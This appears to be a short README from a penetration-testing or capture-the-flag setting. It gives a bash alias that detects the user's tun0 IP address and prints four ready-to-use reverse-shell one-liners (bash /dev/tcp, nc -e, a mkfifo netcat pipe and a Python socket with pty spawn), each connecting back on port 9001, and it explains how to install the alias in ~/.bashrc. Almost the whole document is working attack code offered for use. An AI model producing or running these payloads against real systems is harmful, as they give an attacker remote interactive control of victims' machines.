# Set a Bash Alias for Common Reverse Shell's
```bash
alias reverse="arg1=\$(ip -f inet addr show tun0 | grep -Po 'inet \K[\d.]+'); printf \"bash -i >& /dev/tcp/\$arg1/9001 0>&1\"; printf \"\n\nnc -e /bin/sh \$arg1 9001\"; printf \"\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc \$arg1 9001 >/tmp/f\";printf \"\n\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"\$arg1\\\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"/bin/bash\\\")'\n\n\""
```
# Instructions
<br>
• 1. vim ~/.bashrc
<br>
• 2. copy and paste the above text (see screenshot)
<br>
• 3. save, then open a new terminal and type "<b>reverse</b>"

# Screenshots
<i>~/.bashrc</i>
<img src="https://i.imgur.com/4gWwukP.png">
<br>
<i>running the alias</i>
<img src="https://i.imgur.com/SSu6L0r.png">
<br>
<br>
<b>Please feel free to modify this!</b>
